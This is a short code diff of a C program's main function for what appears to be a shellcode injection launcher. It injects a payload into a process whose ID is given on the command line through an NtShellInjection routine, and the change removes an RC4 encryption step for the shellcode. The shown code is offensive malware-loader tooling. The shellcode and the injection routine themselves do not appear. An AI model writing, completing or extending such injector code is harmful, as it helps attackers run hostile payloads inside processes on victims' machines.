@@ -40,9 +40,6 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    printf("[!!!] Initiating (NT) SKID Launcher!\n");
-
-
     // prints out unencrypted shellcode
     for (int i = 0; i < sizeof(Shellcode); i++)
     {
@@ -59,21 +56,11 @@ int main(int argc, char* argv[])
     INFO("Current Shellcode Address: %p", &Shellcode);
     INFO("Shellcode size: %zu bytes", sc_size);
 
-    
-    printf("[>] Press <Enter> To Encrypt Shellcode!\n");
-    getchar();
-
-    if (!EncryptRC4(Shellcode, sc_size))
-    {
-        WARN("Encryption Failed! Exiting...");
-        return -1;
-    }
-
     printf("[>] Press <Enter> To Inject Payload!\n");
     getchar();
 
 
-    if (!NtShellInjection(atoi(argv[1]), Shellcode ,Shellcode, sc_size))
+    if (!NtShellInjection(atoi(argv[1]), Shellcode, sc_size))
     {
         WARN("Injection Failed! Exiting...");
         return -1;
